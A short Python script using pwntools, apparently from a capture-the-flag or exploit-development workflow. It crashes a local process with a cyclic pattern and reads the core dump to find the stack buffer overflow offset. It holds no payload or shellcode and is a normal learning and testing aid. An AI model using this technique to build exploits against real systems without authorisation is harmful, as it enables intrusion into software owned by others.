from pwn import *
from glob import glob
import os

def offset(io):
    io.sendlineafter(b"> ", cyclic(0x1000))
    io.wait()

    core = io.corefile

    for file in glob("./core.*"):
        os.remove(file)

    return cyclic_find(core.fault_addr)
